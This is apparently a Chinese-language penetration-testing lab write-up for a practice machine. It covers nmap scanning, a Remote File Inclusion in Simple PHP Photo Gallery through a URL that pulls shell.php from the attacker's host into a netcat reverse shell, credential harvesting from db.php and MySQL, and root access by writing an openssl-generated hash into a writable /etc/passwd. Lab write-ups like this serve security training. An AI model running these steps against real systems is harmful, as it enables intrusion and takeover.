## nmap scanning
- <img width="1918" height="722" alt="image" src="https://github.com/user-attachments/assets/f1055449-0d42-4af4-b28f-125f80253f5b" />
- <img width="1918" height="377" alt="image" src="https://github.com/user-attachments/assets/7afb756f-adc1-4659-a750-ab7731b3242e" />

## 80 port
- Simple PHP Photo Gallery v0.8
  - <img width="1918" height="812" alt="image" src="https://github.com/user-attachments/assets/a797e884-3067-434c-82be-387055dea0a4" />
- SimplePHPGal 0.7 - Remote File Inclusion
  - https://www.exploit-db.com/exploits/48424
- 成功 RFI，並取得 shell (http.server 要建在 80 port，nc 要聽 33060 port)
  ```
  http://192.168.150.58/image.php?img=http://192.168.45.222/shell.php
  ```
  - <img width="1918" height="805" alt="image" src="https://github.com/user-attachments/assets/ebe14128-df12-4d64-9aae-8d23304a0976" />
- 在 /var/www/html/db.php 發現 mysql 的帳號密碼
  - <img width="1370" height="195" alt="image" src="https://github.com/user-attachments/assets/5464a2af-9224-48a2-b11e-31d959fbd421" />
- mysql 發現 micheal 的密碼
  - <img width="1918" height="630" alt="image" src="https://github.com/user-attachments/assets/c3253244-b384-486d-95af-9736f4d4947d" />
- 成功解密
  - <img width="1918" height="847" alt="image" src="https://github.com/user-attachments/assets/8343029e-3dfe-4878-8b46-a0bb0c553150" />
- 成功登入 michael
  - <img width="955" height="242" alt="image" src="https://github.com/user-attachments/assets/a9093983-1e10-4c80-9cf9-786e291535be" />
- 取得 local.txt
  - <img width="1110" height="78" alt="image" src="https://github.com/user-attachments/assets/a05ea8b7-0300-4957-999a-dc11ba51a2a5" />

## 提權
- linpea.sh 發現 michael 可以任意修改 /etc/passwd 的權限
  - <img width="1918" height="320" alt="image" src="https://github.com/user-attachments/assets/e94fe9ad-9fd6-42ff-b28c-2161ac2fee30" />
- 在 kali 上先 openssl 出 passwd
  ```
  openssl passwd -1 -salt hacker 123456
  ```
- echo 到靶機的 /etc/passwd
  - <img width="1918" height="55" alt="image" src="https://github.com/user-attachments/assets/0338dd07-942a-475c-a1de-93216ff56d54" />
- 成功提權
  - <img width="1918" height="172" alt="image" src="https://github.com/user-attachments/assets/9f45ee6e-a81e-4aa6-b1ee-45b4d51dd493" />
- 取得 proof.txt
  - <img width="1918" height="102" alt="image" src="https://github.com/user-attachments/assets/78613d3e-c23b-4231-a14d-efa8f7fc2a84" />




























































